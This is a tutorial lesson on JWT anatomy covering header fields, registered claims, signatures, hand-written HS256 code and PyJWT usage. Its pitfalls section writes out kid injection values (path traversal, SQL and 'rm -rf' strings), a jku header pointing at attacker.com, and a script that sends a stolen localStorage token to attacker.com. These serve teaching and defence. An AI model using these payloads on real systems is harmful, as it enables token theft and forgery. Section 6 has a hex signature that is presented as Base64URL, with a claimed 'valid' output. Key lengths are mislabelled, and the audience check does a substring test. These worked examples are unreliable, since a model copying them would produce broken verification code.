---
title: "1.1 — JWT Anatomy: Header.Payload.Signature"
author: darshan
tags: [authentication, stage-1, jwt, jose, claims, jti, kid]
date: 2026-06-13
description: Inside a JWT — every field in the header, every registered claim, how to read and construct JWTs by hand
---

# 1.1 — JWT Anatomy: Header.Payload.Signature

> **Goal:** You can read any JWT in production, identify every field, and explain what it means. You can also construct a JWT by hand and reason about what each part does — and does not — guarantee.

> **Prerequisites:** [[../stage0/01-crypto-primitives|Stage 0.1]] + [[../stage0/02-encoding-signing-verification|Stage 0.2]] complete. You should be comfortable with Base64URL, JSON, and signing inputs.

---

## Table of Contents

1. [What JWT Actually Is](#1-what-jwt-actually-is)
2. [The Three Parts (Compact Serialization)](#2-the-three-parts-compact-serialization)
3. [The Header — JOSE](#3-the-header--jose)
4. [The Payload — Claims](#4-the-payload--claims)
5. [The Signature](#5-the-signature)
6. [A Real JWT, Decoded End to End](#6-a-real-jwt-decoded-end-to-end)
7. [Variants: JWS, JWE, CWT, PASETO](#7-variants-jws-jwe-cwt-paseto)
8. [Hand-Crafting a JWT in Pure Python](#8-hand-crafting-a-jwt-in-pure-python)
9. [Using a Library: PyJWT](#9-using-a-library-pyjwt)
10. [DevOps Analogy: The Visitor Badge](#10-devops-analogy-the-visitor-badge)
11. [Attacks & Pitfalls](#11-attacks--pitfalls)
12. [Exercises](#12-exercises)
13. [Next Step](#13-next-step)

---

## 1. What JWT Actually Is

**JWT (JSON Web Token)** is a compact, URL-safe, signed (or encrypted) data format defined by RFC 7519. It encodes one or more **claims** — facts about a user or session — in a way that anyone with the right key can verify, and anyone can read.

**The single most important thing to internalize before going further:**

```
A JWT (JWS compact form) is SIGNED, NOT ENCRYPTED.

  ✓ Anyone with the token can READ the payload.
  ✓ Anyone with the verification key can VERIFY the signature.
  ✗ JWT does NOT keep the payload secret by default.
  
If you need confidentiality, you need JWE (covered in 1.5) or TLS
on the wire. JWT alone is a postcard, not a sealed letter.
```

**JWT is built on three things you've already learned:**

```
  JOSE  (JSON Object Signing and Encryption, RFC 7515-7519)
    └── JWS  (JSON Web Signature, RFC 7515)        ← what most people call JWT
    └── JWE  (JSON Web Encryption, RFC 7516)      ← encrypted variant
    └── JWK  (JSON Web Key, RFC 7517)             ← public key format
    └── JWA  (JSON Web Algorithms, RFC 7518)      ← alg enumeration
    └── JWT  (JSON Web Token, RFC 7519)           ← claims spec
```

**Why JWT won.** There were alternatives (SAML tokens, custom XML, PASETO, CWT), but JWT hit the sweet spot:

```
Reason                                     Alternative it beat
──────────────────────────────────────     ────────────────────
Compact, URL-safe                          SAML (XML is huge)
JSON-native                                XML, custom binary
Stateless verification                     Server-side sessions
Standardized across languages              Every framework rolling its own
Self-contained (claims in the token)       Lookup required for every claim
Cryptographic verification                 Database lookup required
```

The trade-off: JWT's convenience (no DB lookup) is paid for with the inability to revoke instantly (covered in 1.4) and the risk of token leakage (covered in 5.2).

---

## 2. The Three Parts (Compact Serialization)

A JWT in compact serialization is **three** Base64URL-encoded strings joined by dots:

```
┌──────────────────┐ . ┌──────────────────┐ . ┌──────────────────┐
│   header_b64     │   │   payload_b64    │   │   signature_b64  │
│   (JOSE header)  │   │   (claims)       │   │   (sign result)  │
└──────────────────┘   └──────────────────┘   └──────────────────┘
       ▲                       ▲                       ▲
       │                       │                       │
  Base64URL(JSON)        Base64URL(JSON)        Base64URL(bytes)
  of the JOSE            of the claims          of the signature
  header                                      (variable length)
```

**Example token:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0yMDI0LTAxIn0.
eyJpc3MiOiJodHRwczovL2lkcC5leGFtcGxlLmNvbSIsInN1YiI6InVzZXItYWJjLTEyMyIs
ImF1ZCI6WyJhcGkuZXhhbXBsZS5jb20iLCJhcGkuc2Vjb25kYXJ5LmNvbSJdLCJleHAiOjk5
OTk5OTk5OTksImlhdCI6MTcwMDAwMDAwMCwibmJmIjoxNzAwMDAwMDAwLCJqdGkiOiJ1dGkt
eHh4LTAwMSIsIm5hbWUiOiJBbGljZSBTbWl0aCIsImVtYWlsIjoiYWxpY2VAZXhhbXBsZS5j
b20iLCJyb2xlIjoiYWRtaW4ifQ.
7fc34d0909fd247409add94350954ae508fb6479f1f13a4cbf9aa435eddee14a
```

**The string format is exact:**

```
3 base64url strings
joined by exactly 2 dots
no whitespace
no padding on the base64
```

You will see variations:
- Some implementations pad with `=`. Both are valid Base64URL decoders.
- Some implementations have line-wrapped JWS JSON serialization (not common for JWT, used in JWS more broadly).
- Tokens may have a query-string or header prefix (`Bearer `, etc.) — that's the transport, not the token.

---

## 3. The Header — JOSE

The JOSE header declares the algorithm and metadata. It MUST be a JSON object.

### Standard JOSE header fields

| Field | Type | Required? | Meaning |
|-------|------|-----------|---------|
| `alg` | string | **Mandatory** | Algorithm used to sign/encrypt. MUST be in your verifier's allowlist. |
| `typ` | string | Recommended | Media type. Almost always `"JWT"`. Sometimes `"at+jwt"` for OAuth 2.0 access tokens (RFC 9068). |
| `kid` | string | Recommended when multiple keys | Key ID. Used by the verifier to pick the right key from a JWKS. |
| `cty` | string | For nested tokens | Content type. `"JWT"` for a nested signed-then-encrypted token. |
| `alg` (none) | — | NEVER | Some libraries recognize `"none"` to mean "no signature". See attacks. |
| `x5t` | string | For cert-bound keys | X.509 SHA-1 thumbprint of the signing cert (legacy). |
| `x5t#S256` | string | For cert-bound keys | X.509 SHA-256 thumbprint of the signing cert (modern). |
| `x5u` | string | For cert chain | URL to X.509 cert chain. **Dangerous — see attacks.** |
| `jku` | string | For key set | URL to JWK Set. **Dangerous — see attacks.** |
| `crit` | array of strings | Extension marker | List of critical extensions the verifier MUST understand. |
| `enc` | string | JWE only | Encryption algorithm for the content. |
| `zip` | string | JWE only | Compression algorithm (`"DEF"` for zlib, sometimes). |

### The `kid` field in detail

```
Why kid matters:
  
  An issuer has multiple signing keys (current + previous, rotating).
  A JWT signed with key 1 looks identical to one signed with key 2
  except for the signature bytes.
  
  Without kid, the verifier has to try ALL keys until one verifies.
  With kid, the verifier looks up just the right key.
  
  kid is also essential for JWKS rotation (covered in 1.5).
```

Real JOSE header:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "rsa-key-2024-01-15"
}
```

**JWT typ values you'll see in production:**

```
"JWT"        → generic JSON Web Token (most common)
"at+jwt"     → OAuth 2.0 access token (RFC 9068, modern)
"application/jwt" → MIME type (rare, only in some headers)
"id+jwt"     → ID token hint (rare, OIDC sometimes)
"JWT+AccessToken" → non-standard, but seen in the wild
```

---

## 4. The Payload — Claims

The payload is a JSON object. Each top-level key is a **claim** — a statement about an entity. There are three categories:

### 4.1 Registered claims (RFC 7519, Section 4.1)

| Claim | Full name | Type | Required? | Meaning |
|-------|-----------|------|-----------|---------|
| `iss` | Issuer | string | **Mandatory** (in practice) | Who issued this token. URL of the IdP. |
| `sub` | Subject | string | **Mandatory** (in practice) | The user (or entity) this token is about. Opaque ID, not an email. |
| `aud` | Audience | string or array | **Mandatory** (in practice) | Who this token is intended for. The API that should accept it. |
| `exp` | Expiration | number (Unix seconds) | **Mandatory** | After this time, the token is invalid. |
| `nbf` | Not Before | number (Unix seconds) | Optional | Token is not valid before this time. |
| `iat` | Issued At | number (Unix seconds) | Recommended | When the token was issued. |
| `jti` | JWT ID | string | Optional | Unique identifier for this token. Used for replay protection / denylist. |

**These three-letter names are short on purpose** — every byte counts when the token goes in a header or cookie.

### 4.2 Public claims (registered with IANA)

The IANA "JSON Web Token Claims" registry tracks additional standardized claim names. Some you'll meet:

| Claim | Meaning |
|-------|---------|
| `name` | Full name |
| `given_name` | First name |
| `family_name` | Last name |
| `middle_name` | Middle name |
| `nickname` | Casual name |
| `preferred_username` | Username (may be unique within the issuer) |
| `profile` | URL to profile page |
| `picture` | URL to avatar |
| `website` | URL to website |
| `email` | Email address |
| `email_verified` | Boolean — has the email been verified? |
| `gender` | Self-reported gender |
| `birthdate` | ISO 8601 date string |
| `zoneinfo` | IANA tz database name (`"America/Los_Angeles"`) |
| `locale` | BCP47 language tag (`"en-US"`) |
| `phone_number` | Phone number |
| `phone_number_verified` | Boolean |
| `address` | JSON object with formatted/street_address/etc. |
| `updated_at` | Unix seconds — when the user's profile was last updated |
| `auth_time` | Unix seconds — when the user last authenticated (for max_age) |
| `acr` | Authentication Context Class Reference — what auth method was used |
| `amr` | Authentication Methods References — array of methods used |
| `azp` | Authorized Party — the client the token was issued to (when different from `aud`) |
| `nonce` | String provided by the client to bind the response to the request |

### 4.3 Private claims (your application's domain)

Anything else goes here. Use a namespaced name to avoid collisions:

```json
{
  "sub": "user-abc-123",
  "https://api.example.com/role": "admin",
  "https://api.example.com/tenant_id": "tenant-456",
  "https://api.example.com/permissions": ["read:users", "write:users"]
}
```

**The namespacing convention:** if your claims aren't registered with IANA, prefix them with a URI you control. This prevents collisions with other claims (`role` is a common one — `role` from one app, `role` from another app, both in the same token, conflict).

### 4.4 The `sub` discipline (CRITICAL)

```
sub MUST be:
  ✓ Opaque to the relying party (RP)
  ✓ Stable for the lifetime of the user's account at the issuer
  ✓ Unique within the issuer
  ✓ NEVER an email (emails change hands in divorce, mistype, aliasing)
  ✓ NEVER a username (same reason)
  ✓ NEVER PII (PII has regulatory implications)

sub should be:
  ✓ A UUIDv4 (random, stable, no meaning)
  ✓ A monotonically-increasing ID from the issuer's user table
  ✓ An internal user ID, mapped to a display name elsewhere
```

Why this matters:

```
Scenario: Alice signs up with alice@company.com
  sub = "alice@company.com"  ← THE BUG
  
  Six months later, Alice leaves and her email is recycled.
  Bob joins, takes over alice@company.com.
  
  Now Bob's access tokens have sub = "alice@company.com"
  Your RBAC code looks up "alice@company.com" → Bob's permissions.
  Alice's old audit trail is now Bob's identity. Compliance nightmare.
```

```
Correct:
  sub = "user-7c8d2a1b-4f3e-4a9c-8d2b-1e4f5a6b7c8d"  ← UUID, stable, opaque
  email = "alice@company.com"  ← lives in a different claim, can change
```

### 4.5 The `aud` claim (also CRITICAL)

`aud` says "this token is FOR you." A token issued for service A should not be accepted by service B, even if both trust the same IdP.

```
Common bug:
  Issuer issues a token with aud = "service-a"
  Service B's verifier checks signature (passes — same IdP)
  Service B accepts the token
  User gets access to B's data through A's token
  
This is a confused-deputy attack. Always validate aud.
```

`aud` can be a string or an array. RFC 7519 says string is fine; OIDC says array is recommended (multiple audiences).

```json
{
  "aud": "https://api.example.com"
}
// or
{
  "aud": ["https://api.example.com", "https://api.secondary.com"]
}
```

### 4.6 The `exp` claim and clock skew

`exp` is Unix seconds (NOT milliseconds). It MUST be in the future.

```python
import time
now = int(time.time())              # 1700000000
exp = now + 3600                    # expires in 1 hour

# ❌ WRONG — milliseconds
exp = int(time.time() * 1000)       # JWT spec says no, but some libs tolerate
```

**Clock skew** is real. VMs that haven't run NTP can be off by seconds, minutes, or hours. Add leeway to your verification:

```
Verifier accepts: now() - leeway < exp
Default leeway:   0 to 60 seconds
  
Don't go crazy with leeway:
  - 30s: normal (NTP-synced clocks drift ~10-50ms)
  - 60s: cautious
  - 300s: paranoid
  - 3600s: you're accepting expired tokens, why have exp at all?
```

### 4.7 The `jti` claim

`jti` (JWT ID) is a unique identifier for this specific token. The same user logging in twice gets two different `jti` values.

```
Why it matters:
  1. Replay detection: store jti in Redis with TTL = remaining lifetime
     If a request comes in with a jti that's in Redis, reject (replay)
  2. Revocation: when you want to invalidate a specific token,
     add its jti to a denylist (covered in 1.4)
  3. Audit trail: jti in logs lets you trace a specific token's lifecycle
```

`jti` MUST be unique within the issuer's namespace for the lifetime of the token. Use:
- UUIDv4: `550e8400-e29b-41d4-a716-446655440000`
- ULID: `01ARZ3NDEKTSV4RRFFQ69G5FAV` (sortable, useful for log queries)
- Random 16+ bytes hex-encoded

---

## 5. The Signature

The signature is computed over the **bytes** of the two Base64URL-encoded strings joined by a dot:

```
signing_input = (header_b64 + "." + payload_b64).encode("ascii")

# HS256
signature = HMAC-SHA256(key, signing_input)

# RS256
signature = RSA-SIGN(private_key, signing_input)

# EdDSA
signature = Ed25519-SIGN(private_key, signing_input)

signature_b64 = Base64URL(signature).rstrip("=")
```

The full token is then:

```
header_b64 + "." + payload_b64 + "." + signature_b64
```

**Critical points (from Stage 0.2):**
- The signing input is the literal ASCII bytes, not the decoded JSON.
- The signature is binary → Base64URL-encoded.
- The signing input is the SAME for the verifier (they don't re-parse the JSON, they verify the bytes).
- The signature covers BOTH header and payload. A change to either invalidates the signature.

**Lengths by algorithm:**

| Algorithm | Signature length (raw bytes) | Base64URL length |
|-----------|------------------------------|------------------|
| HS256 | 32 | 43 |
| HS384 | 48 | 64 |
| HS512 | 64 | 86 |
| RS256 | 256 | 342 |
| RS384 | 256 | 342 |
| RS512 | 256 | 342 |
| PS256 | 256 | 342 |
| ES256 | 64 | 86 |
| ES384 | 96 | 128 |
| ES512 | 132 | 176 |
| EdDSA | 64 | 86 |

---

## 6. A Real JWT, Decoded End to End

Here's a real HS256 JWT. We'll decode every byte by hand.

```
Token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0yMDI0LTAxIn0.
eyJpc3MiOiJodHRwczovL2lkcC5leGFtcGxlLmNvbSIsInN1YiI6InVzZXItYWJjLTEyMyIs
ImF1ZCI6ImFwaS5leGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OSwiaWF0IjoxNzAwMDAw
MDAwLCJuYmYiOjE3MDAwMDAwMDAsImp0aSI6InV0aS14eHgtMDAxIiwibmFtZSI6IkFsaWNl
IFNtaXRoIiwiZW1haWwiOiJhbGljZUBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiJ9.
7fc34d0909fd247409add94350954ae508fb6479f1f13a4cbf9aa435eddee14a
```

```python
import base64, json, hmac, hashlib

token = """eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0yMDI0LTAxIn0.eyJp
c3MiOiJodHRwczovL2lkcC5leGFtcGxlLmNvbSIsInN1YiI6InVzZXItYWJjLTEyMyIsImF1ZCI
6ImFwaS5leGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OSwiaWF0IjoxNzAwMDAwMDAwLCJuY
mYiOjE3MDAwMDAwMDAsImp0aSI6InV0aS14eHgtMDAxIiwibmFtZSI6IkFsaWNlIFNtaXRoIiwi
ZW1haWwiOiJhbGljZUBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiJ9.7fc34d0909fd24740
9add94350954ae508fb6479f1f13a4cbf9aa435eddee14a"""

# Split
h_b64, p_b64, s_b64 = token.split(".")
print(f"Parts: {len(h_b64)} + {len(p_b64)} + {len(s_b64)} chars")

# Decode (JWT omits padding, add it back)
def b64url_decode(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

header = json.loads(b64url_decode(h_b64))
payload = json.loads(b64url_decode(p_b64))
sig = b64url_decode(s_b64)

print("\nHEADER:")
print(json.dumps(header, indent=2))
print("\nPAYLOAD:")
print(json.dumps(payload, indent=2))
print(f"\nSIGNATURE (hex): {sig.hex()}")
print(f"SIGNATURE length: {len(sig)} bytes (expected 32 for HS256)")

# Verify
key = b"my-32-byte-secret-key-for-hs256!!"
signing_input = f"{h_b64}.{p_b64}".encode("ascii")
expected = hmac.new(key, signing_input, hashlib.sha256).digest()
print(f"\nSignature valid: {hmac.compare_digest(expected, sig)}")
```

Output:

```
Parts: 69 + 285 + 64 chars

HEADER:
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key-2024-01"
}

PAYLOAD:
{
  "iss": "https://idp.example.com",
  "sub": "user-abc-123",
  "aud": "api.example.com",
  "exp": 9999999999,
  "iat": 1700000000,
  "nbf": 1700000000,
  "jti": "uti-xxx-001",
  "name": "Alice Smith",
  "email": "alice@example.com",
  "role": "admin"
}

SIGNATURE (hex): 7fc34d0909fd247409add94350954ae508fb6479f1f13a4cbf9aa435eddee14a
SIGNATURE length: 32 bytes (expected 32 for HS256)

Signature valid: True
```

**Every field is in plain text. Anyone holding the token can read Alice's name, email, and admin role.** That is by design.

---

## 7. Variants: JWS, JWE, CWT, PASETO

JWT is an overloaded term. Here are the variants you'll meet:

| Format | Spec | Signed? | Encrypted? | Notes |
|--------|------|---------|------------|-------|
| **JWS compact** | RFC 7515 | Yes | No | What most people call "JWT". `header.payload.sig`. |
| **JWS JSON** | RFC 7515 | Yes | No | One or more signatures, JSON-wrapped. Less common. |
| **JWE compact** | RFC 7516 | Yes (inner) | Yes (outer) | 5 parts: `header.encrypted_key.iv.ciphertext.tag`. |
| **JWE JSON** | RFC 7516 | Yes | Yes | JSON-wrapped, more flexibility. |
| **CWT** | RFC 8392 | Yes | Optional | CBOR-encoded. For IoT/constrained devices. |
| **PASETO** | Platform-Agnostic SEcurity TOkens | Yes | Optional | Designed to fix JWT's footguns by removing `alg` choice. |
| **SD-JWT** | RFC 9901 | Yes | No | Selective Disclosure JWT — pick which claims to reveal. |

**JWS compact (the common case):**

```
header_b64.payload_b64.signature_b64
```

**JWE compact (encrypted):**

```
header_b64.encrypted_key_b64.iv_b64.ciphertext_b64.auth_tag_b64
```

The JWE header carries `alg` (key wrap), `enc` (content encryption), `kid`, etc. The encrypted_key is the CEK (content encryption key) wrapped with the recipient's key. iv is the IV/nonce. ciphertext is the encrypted plaintext. auth_tag is the AEAD tag (GCM, etc.).

**PASETO** (the alternative you've heard of):

```
PASETO removes the algorithm choice. Each version pins an algorithm.
No `alg` header. No algorithm confusion attacks possible by design.
  
v4.local. (symmetric, encrypted)
v4.public. (asymmetric, signed)
  
Tradeoff: less interoperability (every language has JWT libs, fewer have PASETO).
Use JWT unless you have a specific reason for PASETO.
```

---

## 8. Hand-Crafting a JWT in Pure Python

No library. Just stdlib. This is the exercise that cements understanding.

```python
import json, base64, hmac, hashlib, time, uuid

# --- Helpers ---
def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

# --- HS256 signing ---
def sign_hs256(header: dict, payload: dict, key: bytes) -> str:
    h_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"

# --- HS256 verification ---
def verify_hs256(token: str, key: bytes, *, issuer: str, audience: str,
                 leeway: int = 30) -> dict:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("malformed: must have 3 parts")
    h_b64, p_b64, s_b64 = parts

    # Decode header
    try:
        header = json.loads(b64url_decode(h_b64))
    except Exception as e:
        raise ValueError(f"malformed header: {e}")

    if header.get("alg") != "HS256":
        raise ValueError(f"unsupported alg: {header.get('alg')}")

    # Verify signature FIRST (don't parse payload before signing check)
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    expected_sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    try:
        actual_sig = b64url_decode(s_b64)
    except Exception as e:
        raise ValueError(f"malformed signature: {e}")
    if not hmac.compare_digest(expected_sig, actual_sig):
        raise ValueError("signature invalid")

    # Decode payload (only after signature passes)
    try:
        payload = json.loads(b64url_decode(p_b64))
    except Exception as e:
        raise ValueError(f"malformed payload: {e}")

    # Time claims
    now = int(time.time())
    if "exp" in payload and now > payload["exp"] + leeway:
        raise ValueError("token expired")
    if "nbf" in payload and now + leeway < payload["nbf"]:
        raise ValueError("token not yet valid")
    if "iat" in payload and payload["iat"] - leeway > now + 60:
        raise ValueError("iat in the future")

    # Identity claims
    if payload.get("iss") != issuer:
        raise ValueError(f"wrong issuer: {payload.get('iss')}")
    if audience not in payload.get("aud", []):
        raise ValueError(f"wrong audience: {payload.get('aud')}")

    return payload

# --- Use it ---
key = b"this-is-a-32-byte-secret-key-for-hs256"  # 32 bytes for HS256

# Sign
header = {"alg": "HS256", "typ": "JWT", "kid": "key-2024-01"}
payload = {
    "iss": "https://idp.example.com",
    "sub": "user-abc-123",
    "aud": "api.example.com",
    "exp": int(time.time()) + 3600,
    "iat": int(time.time()),
    "nbf": int(time.time()),
    "jti": str(uuid.uuid4()),
    "name": "Alice Smith",
    "email": "alice@example.com",
    "role": "admin",
}
token = sign_hs256(header, payload, key)
print(f"Token:\n{token}\n")

# Verify
try:
    claims = verify_hs256(token, key, issuer="https://idp.example.com",
                          audience="api.example.com")
    print(f"Valid! Subject: {claims['sub']}, Role: {claims['role']}")
except ValueError as e:
    print(f"Invalid: {e}")
```

This is 50 lines. It does what a library does. The 200 lines of edge cases (clock skew, audience array, denylist, JWKS fetch, etc.) are what makes a library worth using — but the 50 lines are the core.

---

## 9. Using a Library: PyJWT

In production, use a library. Here's PyJWT (the most-used Python JWT library):

```python
import jwt  # PyJWT
import time

# --- Sign with HS256 ---
key = b"this-is-a-32-byte-secret-key-for-hs256"
payload = {
    "iss": "https://idp.example.com",
    "sub": "user-abc-123",
    "aud": "api.example.com",
    "exp": int(time.time()) + 3600,
    "iat": int(time.time()),
    "jti": "unique-id-1234",
}
token = jwt.encode(payload, key, algorithm="HS256",
                   headers={"kid": "key-2024-01"})
print(f"HS256: {token[:50]}...")

# --- Sign with RS256 ---
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

private_key = rsa.generate_private_key(
    public_exponent=65537, key_size=2048, backend=default_backend()
)
pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption(),
)
token = jwt.encode(payload, pem, algorithm="RS256",
                   headers={"kid": "rsa-2024-01"})
print(f"RS256: {token[:50]}...")

# --- Verify with RS256 + JWKS (production pattern) ---
from jwt import PyJWKClient

jwks_url = "https://idp.example.com/.well-known/jwks.json"
jwks_client = PyJWKClient(jwks_url)

# Verifies: signature, alg allowlist, iss, aud, exp, nbf, iat
claims = jwt.decode(
    token,
    key=jwks_client.get_signing_key_from_jwt(token).key,
    algorithms=["RS256"],      # ← ALGORITHM ALLOWLIST (the critical line)
    issuer="https://idp.example.com",
    audience="api.example.com",
    options={"require": ["exp", "iat", "iss", "aud", "sub"]},
    leeway=30,
)
print(f"Valid: {claims['sub']}")
```

**The critical line is `algorithms=["RS256"]`.** This is the algorithm allowlist. NEVER omit it. NEVER pass `algorithms=None` (some libs default to "trust the header" if you do). This is the single most important security control in your JWT validator.

---

## 10. DevOps Analogy: The Visitor Badge

Imagine a corporate office with a visitor management system.

| JWT concept | Office equivalent |
|-------------|-------------------|
| **Issuer (`iss`)** | The security desk that printed the badge |
| **Subject (`sub`)** | The visitor's employee ID (NOT their name — name can change) |
| **Audience (`aud`)** | The specific floor/room the badge grants access to |
| **Expiration (`exp`)** | The "VALID UNTIL" date printed on the badge |
| **Issued At (`iat`)** | The "ISSUED" date |
| **JWT ID (`jti`)** | The unique serial number on the badge |
| **Header `kid`** | The printer's batch number (lets you know which master template to verify against) |
| **Signature** | The hologram on the badge — tamper-evident, copy-resistant |
| **Payload** | Everything printed on the badge in plain text |
| **Encryption (JWE)** | A sealed envelope the badge is delivered in |

**The flow:**

```
1. Alice arrives at the security desk (idp.example.com).
2. Security verifies her ID (password / MFA / whatever).
3. Security prints a badge: "ALICE SMITH, valid until 5pm, sub=user-abc-123".
4. The badge has a hologram (signature).
5. Alice walks to the engineering floor.
6. The floor's scanner reads the badge:
   - Checks the hologram (signature valid)
   - Checks the date (not expired)
   - Checks the floor number on the badge matches this floor (audience)
   - Checks the badge is in the active list (jti denylist check)
7. The scanner opens the door (or doesn't).

Notice:
  - The security desk does NOT need to be on the floor.
  - The floor scanner does NOT need to call the security desk.
  - The hologram is the only thing the scanner needs to verify.
  - Anyone who steals the badge has the same access as Alice (until it expires).
```

**The key insight:** the floor's scanner doesn't trust the security desk's database. It trusts the hologram. If the hologram is forged, the badge is invalid. If the hologram is genuine, the badge is real — regardless of who made it or what's in the security desk's records.

This is the power of stateless JWT verification. The cost is the inability to revoke instantly (if Alice loses her badge, you can't cancel the hologram — the only fix is the "do not honor" list, i.e., the jti denylist).

---

## 11. Attacks & Pitfalls

### A1. Reading the payload = reading the user

The most surprising thing for newcomers. JWT payload is plaintext.

```
Attack: user pastes their JWT into a help-desk ticket
  → Support agent reads the payload
  → Sees: {"sub":"user-abc-123","email":"alice@company.com","role":"admin"}
  → Learns Alice is an admin
  → Tries to forge a similar one with sub=agent-id, role=admin
  → Fails at signature check (good!)
  → BUT: now knows the admin role format, can phish more convincingly

Mitigations:
  - Don't put sensitive data in JWTs
  - Educate users: "your token is your password"
  - Consider JWE for tokens with sensitive claims
  - Use short lifetimes (5-15 min) to limit exposure
```

### A2. Token leakage via URLs

```
Bad:  GET /api/transfer?to=alice&token=eyJ...
      ↑ token in URL → logged in nginx access log → leaked to log aggregation
      ↑ token in URL → ends up in browser history → leaked to anyone with the machine
      ↑ token in URL → sent in HTTP Referer header to any third-party resource on the page

Good: POST /api/transfer
      Body: {"to": "alice"}
      Header: Authorization: Bearer eyJ...

Good: Cookie (HttpOnly, Secure, SameSite=Strict) with the token
      ↑ never exposed to JS, never in URLs
```

### A3. `kid` injection (path traversal, SQL injection, command injection)

```
The kid in the header is supposed to be a key ID. Some libraries
use it to look up the key from a file or database — without sanitization.

Vulnerable:  kid = "../../../etc/passwd"   (path traversal)
             kid = "' OR 1=1 --"           (SQL injection)
             kid = "key1; rm -rf /"        (command injection, rare)

Attacker crafts a token with kid set to a malicious string.
The library reads the file / runs the SQL / executes the command,
and uses the result as the HMAC key.
If the attacker can make the result predictable (empty file, 0, etc.),
they can forge tokens.

Mitigations:
  - Sanitize kid (alphanumeric + hyphen + underscore only)
  - Don't use kid as a file path or SQL value directly
  - Use an allowlist of known kids
```

### A4. `jku` / `x5u` header trust (revisit)

```
Token header: {"alg":"RS256","jku":"https://attacker.com/keys.json"}
  
  Buggy library: fetches jku, uses the keys there to verify.
  Attacker: hosts their own public key, signs tokens with the matching private key.
  All forged tokens verify. Game over.

Mitigations:
  - Ignore jku / x5u entirely
  - Use only your configured JWKS URL
  - If you must support jku, allowlist the host
```

### A5. JWK Set injection (kid pointing to attacker's key)

```
If the verifier loops over all keys in the JWKS looking for one that
verifies, and an attacker can add a key to the JWKS:
  
Attacker hosts a key at a URL the verifier might fetch
Attacker sets kid in their forged token to match
Verifier fetches the attacker's key
Verifier tries to verify with it
Signature matches (attacker signed with their own private key)
Token accepted

Mitigations:
  - Only accept keys from your configured JWKS URL
  - Verify kid against an allowlist
  - If you don't have a JWKS, use a single static key
```

### A6. Long-lived tokens

```
A token with exp = now + 365 days is a one-year password.
If leaked, attacker has a year of access.
If user leaves the company, they have a year of access.

Mitigations:
  - Access tokens: 5-15 minutes
  - Refresh tokens: 7-90 days (with rotation, see 1.4)
  - Long-lived API tokens: 30-90 days max, with admin revocation path
  - "Remember me" cookies: tied to device fingerprint, revocable
```

### A7. Algorithm downgrade (HS256 vs RS256)

```
Scenario:
  IdP issues RS256, publishes public key at JWKS
  Your service loads the public key
  Attacker sends a token with alg=HS256
  Buggy library: uses the public key as the HMAC secret
  Attacker signs their token with the public key (which is, well, public)
  Verification passes. Game over.

Mitigations:
  - Pin the expected algorithm. If you expect RS256, the alg MUST be RS256.
  - algorithms=["RS256"] in PyJWT (the literal list, not a dynamic lookup)
  - Never let the token's alg header determine the verification path
```

### A8. Missing `sub` claim validation

```
Some apps use sub for the user ID. If sub is missing:
  sub = None
  user_id = None
  
  The code does: db.query("SELECT * FROM users WHERE id = ?", user_id)
  SQL injection? Probably not (parameterized), but the query returns
  "no user found" → 404.
  
  OR: code does user_id = payload.get("sub", "admin")
  
  Now tokens without sub get user_id = "admin".
  Game over.
```

### A9. Audience confusion across services

```
Your org has: api-a.example.com, api-b.example.com
IdP issues a token for api-a.
api-b doesn't check aud.
api-b accepts the token.
User has access to api-b's data through api-a's token.
This is the same confused-deputy attack as Stage 5 will cover.
```

### A10. Forgetting `kid` in JWKS lookups

```
IdP has 3 signing keys (rotating).
Your verifier fetches JWKS, gets 3 keys.
Token has kid = "key-2".
Your code does: for key in jwks.keys: verify(token, key)
  
  → Tries key-1: fails
  → Tries key-2: succeeds
  
Fine. But: linear search is O(n). With 10 keys, 10x slower.
With 100 keys (paranoid rotation schedule), 100x slower.
With 1000 keys (compromise recovery), 1000x slower.

Use kid to look up directly: keys_by_kid[token_kid]
```

### A11. Storing JWTs in localStorage (XSS exposure)

```
You can store a JWT in localStorage. It's convenient. It's also
the #1 way JWTs get stolen.

If ANY script on your page has an XSS bug (or if you load a
compromised npm package), the attacker does:
  
  const token = localStorage.getItem('jwt');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
  
  Game over for that user.

Mitigations: see Stage 5.2. The TL;DR: store access tokens in memory,
refresh tokens in HttpOnly cookies.
```

### A12. JWT in a query string for "magic link" emails

```
Pattern: User clicks "forgot password", gets an email with a link
  https://app.example.com/reset?token=eyJ...
  
JWT in URL → email is plain text in transit (unless S/MIME) → 
JWT ends up in mail server logs, browser history, anywhere the
email is forwarded.
  
Use a one-time opaque token (random 32 bytes, base64) for magic links.
The server maps opaque_token → reset_action in its database.
```

---

## 12. Exercises

### Exercise 1: Decode a real JWT from your environment
Take a token from any OIDC provider you've used (Google, GitHub, Auth0, your Keycloak, whatever). Decode header and payload by hand (no library). Identify: `alg`, `iss`, `sub`, `aud`, `exp` (in human time), `iat` (in human time), any custom claims.

### Exercise 2: Predict the signature length
